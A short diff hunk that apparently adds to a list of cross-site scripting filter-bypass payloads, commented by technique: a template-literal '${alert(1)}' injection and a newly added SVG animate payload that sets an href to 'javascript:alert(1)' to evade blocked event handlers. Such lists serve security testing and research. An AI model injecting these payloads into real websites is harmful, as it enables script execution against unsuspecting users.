@@ -47,3 +47,5 @@ function handleResponse() {
 // bypass angle brackets, single, double quotes, backslash and backticks Unicode-escaped
 ${alert(1)}
 
+// bypass event handlers and href attributes blocked
+<svg><a><animate+attributeName=href+values=javascript:alert(1)+/><text+x=20+y=20>Click%20me</text></a>
